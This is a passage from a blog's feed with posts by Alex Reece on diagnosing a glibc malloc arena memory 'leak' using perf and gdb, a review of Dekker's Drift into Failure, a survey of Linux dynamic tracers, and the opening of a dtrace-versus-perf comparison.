&lt;/div&gt;</content><category term="Linux"></category><category term="tcpdump"></category><category term="wireshark"></category><category term="dbbench"></category></entry><entry><title>Arena "leak" in glibc</title><link href="https://codearcana.com/posts/2016/07/11/arena-leak-in-glibc.html" rel="alternate"></link><published>2016-07-11T00:00:00-07:00</published><updated>2016-07-11T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2016-07-11:/posts/2016/07/11/arena-leak-in-glibc.html</id><summary type="html">&lt;p&gt;I diagnose an unexpected behavior in the glibc malloc implementation manifesting as a slow memory "leak".&lt;/p&gt;</summary><content type="html">&lt;p&gt;I was recently working on really strange memory issue. Over the course of 1-2 weeks, memory usage of &lt;code&gt;memsqld&lt;/code&gt; increased despite no change in the amount of data stored. To make matters even more interesting, &lt;code&gt;memsqld&lt;/code&gt; keeps extremely detailed accounting of memory usage (by tracking calls to &lt;code&gt;mmap&lt;/code&gt;, &lt;code&gt;malloc&lt;/code&gt;, etc). &lt;code&gt;memsqld&lt;/code&gt;'s accounting was off, reporting that we were only use ~2-3G of memory despite actually consuming ~15G of memory. What was going on?&lt;/p&gt;
&lt;p&gt;The first thing I did was capture the output of &lt;code&gt;/proc/$PID/maps&lt;/code&gt; in the offending process and then generated a core dump so I could get &lt;code&gt;memsqld&lt;/code&gt; running again and do analysis offline. &lt;/p&gt;
&lt;p&gt;I summed up all the different types of memory using awk and noticed that the 12GB difference appeared to be coming from ~64MB regions that were mapped &lt;code&gt;rwxp&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat proc_pid_maps &lt;span class="p"&gt;|&lt;/span&gt; gawk &lt;span class="s1"&gt;&amp;#39;{ split($1, a, &amp;quot;-&amp;quot;); b=strtonum(&amp;quot;0x&amp;quot; a[1]); e=strtonum(&amp;quot;0x&amp;quot; a[2]) } /stack/ { t=&amp;quot;stack&amp;quot;; } /heap/ { t=&amp;quot;heap&amp;quot;; } /\.so/ { t=&amp;quot;so&amp;quot; } /\.mu/ { t=&amp;quot;mu&amp;quot; } /\.mo/ { t=&amp;quot;mo&amp;quot;; }  (!t) { $1 = &amp;quot;&amp;quot;; t=$0} { print e-b &amp;quot; &amp;quot; t ; t=&amp;quot;&amp;quot;}&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk &lt;span class="s1"&gt;&amp;#39;{ s=$1; $1=&amp;quot;&amp;quot;; b[$0] += s; c[$0] += 1 } END { print &amp;quot;bytes count type&amp;quot;; for (t in b) { print b[t] &amp;quot; &amp;quot; c[t] &amp;quot; &amp;quot; t } }&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sort -nk 1

&lt;span class="go"&gt;bytes count type&lt;/span&gt;
&lt;span class="go"&gt;4096 1  r-xp 00000000 00:00 0 [vsyscall]&lt;/span&gt;
&lt;span class="go"&gt;8192 1  r--p 00000000 00:00 0 [vvar]&lt;/span&gt;
&lt;span class="go"&gt;8192 1  r-xp 00000000 00:00 0 [vdso]&lt;/span&gt;
&lt;span class="go"&gt;8192 1  r-xp 00000000 ca:3400 262148 /data/logs/sharding_log_0&lt;/span&gt;
&lt;span class="go"&gt;20480 1  r-xp 00000000 ca:3400 262166 /data/logs/app_old_log_0&lt;/span&gt;
&lt;span class="go"&gt;73728 1  r-xp 00000000 ca:3400 262157 /data/logs/app_log_0&lt;/span&gt;
&lt;span class="go"&gt;499712 1  r-xp 00000000 00:42 86 /memsqlbin/lib/interp_ops.bc&lt;/span&gt;
&lt;span class="go"&gt;4460544 125  mo&lt;/span&gt;
&lt;span class="go"&gt;4796416 1  rwxp 02085000 00:42 51 /memsqlbin/memsqld&lt;/span&gt;
&lt;span class="go"&gt;6656000 242  r-xp 00000000 00:00 0&lt;/span&gt;
&lt;span class="go"&gt;8245248 89  mu&lt;/span&gt;
&lt;span class="go"&gt;34103296 1  r-xp 00000000 00:42 51 /memsqlbin/memsqld&lt;/span&gt;
&lt;span class="go"&gt;55984128 81  so&lt;/span&gt;
&lt;span class="go"&gt;375599104 1  heap&lt;/span&gt;
&lt;span class="go"&gt;1515778048 1037  ---p 00000000 00:00 0&lt;/span&gt;
&lt;span class="go"&gt;2380578816 871  stack&lt;/span&gt;
&lt;span class="go"&gt;12578443264 359  rwxp 00000000 00:00 0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Using &lt;code&gt;perf&lt;/code&gt; to trace &lt;code&gt;mmap&lt;/code&gt;s&lt;/h2&gt;
&lt;p&gt;I wanted to see who was allocating these large regions, so I used &lt;code&gt;perf&lt;/code&gt; to record a stack trace any time the &lt;code&gt;memsqld&lt;/code&gt; process &lt;code&gt;mmap&lt;/code&gt;ed a region of memory greater than 60MB in length&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; sudo perf record -g -e syscalls:sys_enter_mmap --filter &lt;span class="s1"&gt;&amp;#39;len &amp;gt; 60000000&amp;#39;&lt;/span&gt; --pid &lt;span class="nv"&gt;$PID_OF_MEMSQL&lt;/span&gt; -o /path/to/storage -- sleep &lt;span class="nv"&gt;$2&lt;/span&gt;_DAYS_IN_SECONDS
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Unfortunately, this proved to be useless -- since &lt;code&gt;libc&lt;/code&gt; on Linux is typically compiled without frame pointers, the stack traces we got were &lt;em&gt;very&lt;/em&gt; short:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;memsqld   531 [003] 3033773.536620: syscalls:sys_enter_mmap: addr: 0x00000000, len: 0x08000000, prot: 0x00000000, flags: 0x00004022, fd: 0xffffffff, off: 0x00000000
        7fb0a4d6297a mmap64 (/lib/x86_64-linux-gnu/libc-2.19.so)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I figured I'd use &lt;code&gt;perf probe&lt;/code&gt; to trace the &lt;code&gt;mmap64&lt;/code&gt; library call boundary so I could see the stacks, but unfortunately, this didn't work inside docker&lt;sup id="fnref-2"&gt;&lt;a class="footnote-ref" href="#fn-2"&gt;2&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;root@memsql-leaf-1-2649458094-nz33q:/data/areece#&lt;/span&gt; perf probe /lib/x86_64-linux-gnu/libc-2.19.so mmap64 &lt;span class="s1"&gt;&amp;#39;len=%si&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;Probe point &amp;#39;mmap64&amp;#39; not found.&lt;/span&gt;
&lt;span class="go"&gt;  Error: Failed to add events.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;A lucky guess&lt;/h2&gt;
&lt;p&gt;Going back to the drawing board, I looked at the data in the core dump. When I looked at the memory near those 64MB sections, I noticed that the contents looked heap-ish:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb) x/100a 0x7f8f98000000
0x7f8f98000000: 0x7f8f98000020  0x0
0x7f8f98000010: 0x3e27000   0x4000000
0x7f8f98000020: 0x200000000 0x7f8f980fa580
0x7f8f98000030: 0x0 0x7f8f9a6646e0
0x7f8f98000040: 0x7f8f9ab025f0  0x0
0x7f8f98000050: 0x0 0x0
0x7f8f98000060: 0x0 0x0
0x7f8f98000070: 0x0 0x7f8f9be069e0
0x7f8f98000080: 0x7f8f9bdda2a0  0x7f8f9bdd9fb0
0x7f8f98000090: 0x7f8f9bdc3210  0x7f8f980910f0
0x7f8f980000a0: 0x7f8f980a4cb0  0x7f8f99678920
0x7f8f980000b0: 0x7f8f9aad0b90  0x7f8f98104070
0x7f8f980000c0: 0x7f8f98057370  0x7f8f9a649470
0x7f8f980000d0: 0x7f8f9aac2df0  0x7f8f9808e630
0x7f8f980000e0: 0x7f8f9a66e920  0x7f8f996222a0
0x7f8f980000f0: 0x7f8f9bce28e0  0x7f8f9ab89030
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Furthermore, the permissions on these pages matched the permissions on our heap:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0345b000-098c0000 rwxp 00000000 00:00 0                                  [heap]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I looked for ways to introspect the &lt;code&gt;glibc&lt;/code&gt; heap and found &lt;code&gt;malloc_stats(3)&lt;/code&gt;. Sure enough, this revealed the issue:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb --batch --pid &lt;span class="m"&gt;6&lt;/span&gt; --ex &lt;span class="s1"&gt;&amp;#39;call malloc_stats()&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;Arena 0:&lt;/span&gt;
&lt;span class="go"&gt;system bytes     =  157237248&lt;/span&gt;
&lt;span class="go"&gt;in use bytes     =   82474432&lt;/span&gt;
&lt;span class="go"&gt;Arena 1:&lt;/span&gt;
&lt;span class="go"&gt;system bytes     =  245886976&lt;/span&gt;
&lt;span class="go"&gt;in use bytes     =    4931712&lt;/span&gt;
&lt;span class="go"&gt;Arena 2:&lt;/span&gt;
&lt;span class="go"&gt;system bytes     =  191258624&lt;/span&gt;
&lt;span class="go"&gt;in use bytes     =    3757776&lt;/span&gt;
&lt;span class="go"&gt;Arena 3:&lt;/span&gt;
&lt;span class="go"&gt;system bytes     =  187617280&lt;/span&gt;
&lt;span class="go"&gt;in use bytes     =    1905632&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; &lt;/span&gt;
&lt;span class="go"&gt;Arena 63:&lt;/span&gt;
&lt;span class="go"&gt;system bytes     =  274530304&lt;/span&gt;
&lt;span class="go"&gt;in use bytes     =    1173504&lt;/span&gt;
&lt;span class="go"&gt;Total (incl. mmap):&lt;/span&gt;
&lt;span class="go"&gt;system bytes     = 3299606528&lt;/span&gt;
&lt;span class="go"&gt;in use bytes     =  645742704&lt;/span&gt;
&lt;span class="go"&gt;max mmap regions =       1086&lt;/span&gt;
&lt;span class="go"&gt;max mmap bytes   =  456876032&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(ignore the total – &lt;code&gt;glibc&lt;/code&gt; uses a 32bit counter for total bytes which overflowed. The correct sum of each arena &lt;code&gt;system_bytes&lt;/code&gt; is 14GB)&lt;/p&gt;
&lt;p&gt;Turns out these regions are the product of a &lt;code&gt;glibc&lt;/code&gt; &lt;code&gt;malloc&lt;/code&gt; feature: &lt;a href="https://siddhesh.in/posts/malloc-per-thread-arenas-in-glibc.html"&gt;per thread arenas&lt;/a&gt;. An arena is a self contained portion of the heap
from which memory can be allocated; each arena is completely independent of the other arenas. The &lt;code&gt;glibc&lt;/code&gt; &lt;code&gt;malloc&lt;/code&gt; implementation attempted to improve performance by allowing all threads to use their own arena (up to a default cap &lt;code&gt;MALLOC_ARENA_MAX&lt;/code&gt; of 8 arenas per CPU core). When a thread goes to allocate memory, it tries to exclusively lock the arena it allocated from most recently; however, upon failing, the thread will switch to another arena or create a new arena if all arenas are busy. &lt;/p&gt;
&lt;p&gt;For applications with a small number of threads that use &lt;code&gt;malloc&lt;/code&gt; heavily, this approach works well. Unfortunately, &lt;code&gt;memsqld&lt;/code&gt; uses &lt;code&gt;malloc&lt;/code&gt; very sparingly but uses a large number of threads; in this workload, we had managed to induce a pathology where we had 64 malloc arenas that were using only ~1% of about ~200MB of system memory for user data, a huge waste of memory. Fortunately, the "fix" is simple –- we set the maximum number of arenas back down to one per core by setting the &lt;code&gt;MALLOC_ARENA_MAX&lt;/code&gt; environment variable appropriately.&lt;/p&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;I found the name of the filter arguments via &lt;code&gt;cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_mmap/format&lt;/code&gt;.&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-2"&gt;
&lt;p&gt;I suspect that &lt;code&gt;perf probe&lt;/code&gt; interacts poorly with Linux filesystem namespaces; has anyone played around here before?&amp;#160;&lt;a class="footnote-backref" href="#fnref-2" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="glibc"></category><category term="perf_events"></category><category term="malloc"></category><category term="Linux"></category></entry><entry><title>A review of Drift Into Failure</title><link href="https://codearcana.com/posts/2016/03/02/a-review-of-drift-into-failure.html" rel="alternate"></link><published>2016-03-02T00:00:00-08:00</published><updated>2016-03-02T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2016-03-02:/posts/2016/03/02/a-review-of-drift-into-failure.html</id><summary type="html">&lt;p&gt;On the advice of a former colleague, I recently read &lt;a href="http://smile.amazon.com/Drift-into-Failure-Components-Understanding-ebook/dp/B009KOKXKY"&gt;&lt;em&gt;Drift into Failure: From Hunting Broken Components to Understanding Complex Systems&lt;/em&gt;&lt;/a&gt; by Sidney Dekker. &lt;/p&gt;
&lt;h2&gt;An overview of &lt;em&gt;Drift into Failure&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;By examining several recent disasters (ranging from the Challenger explosion to the housing market collapse of 2008), Dekker contends that …&lt;/p&gt;</summary><content type="html">&lt;p&gt;On the advice of a former colleague, I recently read &lt;a href="http://smile.amazon.com/Drift-into-Failure-Components-Understanding-ebook/dp/B009KOKXKY"&gt;&lt;em&gt;Drift into Failure: From Hunting Broken Components to Understanding Complex Systems&lt;/em&gt;&lt;/a&gt; by Sidney Dekker. &lt;/p&gt;
&lt;h2&gt;An overview of &lt;em&gt;Drift into Failure&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;By examining several recent disasters (ranging from the Challenger explosion to the housing market collapse of 2008), Dekker contends that root cause analysis is an inherently flawed strategy for understanding failures of large complicated systems (e.g. the NASA bureaucracy or Wall Street). Dekker believes that a single faulty component cannot be held to blame for these failures. Competing pressures (e.g. budget, publicity) can allow complicated systems to tolerate increasing levels of risk over time, leading to a slow "drift into failure" where no one component can be held truly responsible.&lt;/p&gt;
&lt;p&gt;Dekker eventually proposes several ways to avoid this drift. He says that "high reliability organizations" tend to exhibit the following 4 characteristics:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Senior management commitment to safety&lt;/li&gt;
&lt;li&gt;Shared care and concern for hazards and a willingness to learn and understand how they impact people&lt;/li&gt;
&lt;li&gt;Realistic and flexible norms and rules about hazards&lt;/li&gt;
&lt;li&gt;Continual reflection on practice through monitoring, analysis, and feedback systems&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;The last point is the most nuanced. Since organizations will evolve over time, it is important that they continually reflect on how they are changing to ensure they evolve in the best direction for the long term health of the organization.&lt;/p&gt;
&lt;p&gt;This kind of reflection is &lt;em&gt;hard&lt;/em&gt; for most organizations and Dekker offers some interesting suggestions for how to do it. First, he emphasizes that senior management must support this kind reflection and commitment. He then suggests:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Rotating personnel from different places (but similar operations) for shorter periods can in principle be done in a variety of worlds. It represents an important lever for assuring the kind of diversity that can make small steps visible and open for discussion.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;During these discussions, Dekker says:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The questions we should reflect on (even if we may not get clear answers) are two-fold: why did this happen, and why are we surprised that it happened? The first question is about the workings of the complex system and its environment. The second is about our (lack of) understanding of those workings.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In addition, Dekker recommends that organizations give authority to all levels of an organization. He cites the example of the nuclear aircraft carrier:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Even the lowest ranking individual on the deck of an aircraft carrier has the authority (and in indeed the duty) to suspend immediately any take-off or landing that might pose unnecessary risk.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Lastly, he suggests that systems can use this tendency to evolve to push themselves towards safety. Rather than compliance and regulation, he suggests that&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;complex systems should have a co-evolver/counter evolver.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is an entity that is aware of the complexity of the organization (and will evolve with it) and strives to push the organization in a different direction than it would locally optimize for. Dekker doesn't mention it, but I think Netflix's &lt;a href="http://techblog.netflix.com/2012/07/chaos-monkey-released-into-wild.html"&gt;Chaos Monkey&lt;/a&gt; is the perfect example of this.&lt;/p&gt;
&lt;h2&gt;A wrap up&lt;/h2&gt;
&lt;p&gt;Overall, the book was fascinating but hard to read. Unfortunately, Dekker uses very complex language that usually muddles his argument rather than refining it. This confusion was exacerbated by the fact that he only starts proposing solutions in the last chapter. I ended up writing this review because I wanted to share the ideas of the book with other people but wasn't convinced they would read through it.&lt;/p&gt;
&lt;h2&gt;Do startups have a moral imperative not to fail?&lt;/h2&gt;
&lt;p&gt;One of the things that really struck me in the book was that it implicitly assumed that these systems had a moral imperative not to fail. For a mine or airline, where human lives are at stake, that case is "easier" to argue; however, I feel like that is not a core tenet of many web startups. In some sense, the motto "move fast break things" seems like a deliberate acknowledgment that there is no moral imperative to avoid failure.&lt;/p&gt;</content><category term="reviews"></category></entry><entry><title>An informal survey of Linux dynamic tracers</title><link href="https://codearcana.com/posts/2016/01/09/an-informal-survey-of-linux-dynamic-tracers.html" rel="alternate"></link><published>2016-01-09T00:00:00-08:00</published><updated>2016-01-09T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2016-01-09:/posts/2016/01/09/an-informal-survey-of-linux-dynamic-tracers.html</id><summary type="html">&lt;p&gt;I survey some dynamic tracers (e.g. perf, sysdig) available on Linux.&lt;/p&gt;</summary><content type="html">&lt;p&gt;I've gotten some questions about the choice of &lt;code&gt;perf&lt;/code&gt; over all the other
available Linux tracers. This blog post is a quick overview of my personal
experiencing trying several tracers; it is not intended to be authoritative.&lt;/p&gt;
&lt;h2&gt;My requirements&lt;/h2&gt;
&lt;p&gt;Since I use dynamic tracers to iteratively answer
&lt;a href="https://codearcana.com/posts/2016/01/03/dtrace-isnt-just-a-tool-its-a-philosophy.html"&gt;questions&lt;/a&gt; about production systems, I have
several requirements. I'll order them here based on their priority to me:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;A good tracing tool is stable. I do not want my production systems crashing.&lt;/li&gt;
&lt;li&gt;A good tracing tool is low overhead. I want to use it in production
     environments, so it cannot substantially affect system performance.
     This usually means I want some sort of selective filtering or early
     output aggregation.&lt;/li&gt;
&lt;li&gt;A good tracing tool can collect userspace stacks. The most frequent
     question I ask is "Why is my application X", and userspace stacks are the
     number one way I answer this question.&lt;/li&gt;
&lt;li&gt;A good tracing tool has visibility into the kernel. I am frequently asking
     questions about the system (e.g. "Why am I descheduled?" or "Why am I doing
     disk IO?") that can only be answered effectively with kernel support.&lt;/li&gt;
&lt;li&gt;A good tracing tool is easily usable on old (e.g. pre-3.2 kernel)
     systems. For many of my customers, upgrading (especially to mainline
     kernel) is a frightening proposition.&lt;/li&gt;
&lt;li&gt;A good tracing tool already exists on the system. A great tracing tool
     doesn't require special packages to be installed. For many of my customers,
     installing new software (especially on a production server) is a
     challenging or painful process.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Tracers I have tried&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://elinux.org/Ftrace"&gt;&lt;code&gt;ftrace&lt;/code&gt;&lt;/a&gt;: Powerful building block that doesn't
    have a satisfactory front
    end yet. Brendan Gregg has some good tools in his
    &lt;a href="https://github.com/brendangregg/perf-tools"&gt;perf-tools&lt;/a&gt; package.
    Enabled by default even on old kernels and usable with no external packages,
    but requires root.
    Has some quirks: for example, I had difficulty getting userspace stacks to
    work reliably across all events when I tried it.&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://perf.wiki.kernel.org/index.php/Main_Page"&gt;&lt;code&gt;perf&lt;/code&gt;&lt;/a&gt;: Rapidly growing
    frontend for many other kernel tracing subsystems,
    including parts of &lt;code&gt;ftrace&lt;/code&gt;. Has a huge surface area in the kernel and
    in userspace. Kernel support for &lt;code&gt;perf&lt;/code&gt; is very common, although the
    userspace frontent requires a package to be installed. Provides little
    to no support&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt; for in-kernel aggregation (some support for event filtering)
    so all data must be post-processed in userspace -- this can have a large
    performance effect for very frequent events (e.g. scheduler events).
    For this reason, I find the interface pretty clunky.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;perf&lt;/code&gt; is my current favorite tracer because of the support, surface area, and
because it can be used in production environments without custom kernel
modules.    &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://sourceware.org/systemtap/"&gt;&lt;code&gt;systemtap&lt;/code&gt;&lt;/a&gt;: I can't really find
    evidence of people using this legitimately
    except to do kernel development. Was hard to install (required massive
    download of debug symbols and a custom kernel??). I have concerns about its
    viability for production environments.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.sysdig.org/"&gt;&lt;code&gt;sysdig&lt;/code&gt;&lt;/a&gt;: A glorious user interface and easy to
    install, but definitely the
    new kid on the block. Requires a custom kernel module to be installed.
    Only traces at the syscall boundary, which is good enough for some use
    cases, but I generally prefer more visibility into the kernel (for example,
    to see that we're getting descheduled due to page faults, etc).
    Doesn't have a way to filter or aggregate in-kernel events (by design) and
    cannot collect stack traces. These developers seemed very open
    to outside contributors and upstream their work pretty quickly, so maybe
    contributions here could actually be used customers in my lifetime.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Tracers I have investigated&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://lttng.org/"&gt;&lt;code&gt;lttng&lt;/code&gt;&lt;/a&gt;: Incredible docs, but requires a kernel module
    to trace kernel events. Appears to have strong support for a variety of
    userspace applications. Does not appear to do in-kernel aggregation. 
    Can this collect stack traces?&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ktap.org/"&gt;&lt;code&gt;ktap&lt;/code&gt;&lt;/a&gt;: Haven't played around with this but the
    interface is really pretty. I have some concerns about its
    &lt;a href="https://github.com/ktap/ktap/issues"&gt;stability&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://lwn.net/Articles/603983/"&gt;&lt;code&gt;eBPF&lt;/code&gt;&lt;/a&gt;: Looks flexible and will be
    mainline in the kernel, but isn't there on old kernels and doesn't have a
    good frontend yet. I'm watching &lt;a href="https://github.com/iovisor/bcc"&gt;iovisor&lt;/a&gt;
    for that.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Feel free to chime in with any other tracers or commentary.&lt;/p&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;&lt;code&gt;perf stat&lt;/code&gt; can do some aggregation, but unfortunately cannot aggregate on
very complicated things (e.g. stacks).&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="Linux"></category><category term="tracing"></category><category term="perf_events"></category></entry><entry><title>Dtrace isn't just a tool; it's a philosophy</title><link href="https://codearcana.com/posts/2016/01/03/dtrace-isnt-just-a-tool-its-a-philosophy.html" rel="alternate"></link><published>2016-01-03T00:00:00-08:00</published><updated>2016-01-03T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2016-01-03:/posts/2016/01/03/dtrace-isnt-just-a-tool-its-a-philosophy.html</id><summary type="html">&lt;p&gt;I document some pain points from recent performance investigations and then speculate that such issues are endemic to the Linux community.&lt;/p&gt;</summary><content type="html">&lt;p&gt;My most recent &lt;a href="https://codearcana.com/posts/2015/12/20/using-off-cpu-flame-graphs-on-linux.html"&gt;post&lt;/a&gt; was a story about a successful performance investigation. Unfortunately, this happy post was intentionally simplified for the audience of my company's blog. The reality is that I frequently find doing performance investigations on Linux a frustrating process due to the lack of adequate tooling. In this blog post, I document some recent pain points and then speculate that such issues are endemic to Linux.&lt;/p&gt;
&lt;h2&gt;Some pain points&lt;/h2&gt;
&lt;p&gt;Compare how we answer the following questions&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt; (in production) in Linux and FreeBSD/Solaris: &lt;/p&gt;
&lt;h3&gt;Why am I going off CPU?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;FreeBSD/Solaris: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; dtrace -n &lt;span class="s1"&gt;&amp;#39;sched:::off-cpu /pid==$target/ { self-&amp;gt;ts = timestamp; } sched::on-cpu /self-&amp;gt;ts/ { @[stack(), ustack()] = quantize(timestamp - self-&amp;gt;ts); self-&amp;gt;ts = 0}&amp;#39;&lt;/span&gt; -p &lt;span class="nv"&gt;$PID&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Linux: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; perf record -g -e &lt;span class="s1"&gt;&amp;#39;sched:sched_switch&amp;#39;&lt;/span&gt; -e &lt;span class="s1"&gt;&amp;#39;sched:sched_stat_sleep&amp;#39;&lt;/span&gt; -e &lt;span class="s1"&gt;&amp;#39;sched:sched_stat_blocked&amp;#39;&lt;/span&gt; -p &lt;span class="nv"&gt;$PID&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then post process with &lt;code&gt;perf inject -s&lt;/code&gt; (if you have it) or my 200 line &lt;code&gt;stackcollapse-perf-sched.awk&lt;/code&gt; script. Unfortunately, tracing all scheduler events is very high overhead in perf and the lack of in-kernel aggregation means that events probably will be dropped if load is high. Even more alarmingly, there appear to be bugs in perf that prevent it from reliably getting consistent traces (even with large trace buffers), causing it to produce empty perf.data files with error messages of the form: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x952790 [0x736d]: failed to process type: 3410
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since this failure is not deterministic, re-executing &lt;code&gt;perf record&lt;/code&gt; will eventually succeed; however, it then can sometimes be hard to catch the pathology.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Why am I calling &lt;code&gt;malloc&lt;/code&gt;?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;FreeBSD/Solaris: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; dtrace -n &lt;span class="s1"&gt;&amp;#39;pid$target::malloc:entry { @[ustack()] = count(arg0); } -p $PID&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Linux: It is possible you could write a &lt;code&gt;gdb&lt;/code&gt; script, although I'd be scared to do this in production. Another alternative is use the &lt;code&gt;uprobe&lt;/code&gt; interface:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; perf probe /lib/x86_64-linux-gnu/libc.so.6 malloc &lt;span class="s1"&gt;&amp;#39;size=%di&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; perf record -e probe_libc:malloc -g --pid &lt;span class="nv"&gt;$PID&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aside from the common message about the overhead of not having in kernel aggregates, I've found this interface to be particularly brittle. Even scarier, &lt;a href="http://www.brendangregg.com/blog/2015-06-28/linux-ftrace-uprobe.html"&gt;Brendan Gregg&lt;/a&gt; also warns about issues that would make it unsuitable for production environments (I haven't personally seen this when using &lt;code&gt;perf&lt;/code&gt; yet):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;frequently hit issues where the target process either crashes or enters an endless spin loop&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;What files am I reading?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;FreeBSD/Solaris: &lt;/p&gt;
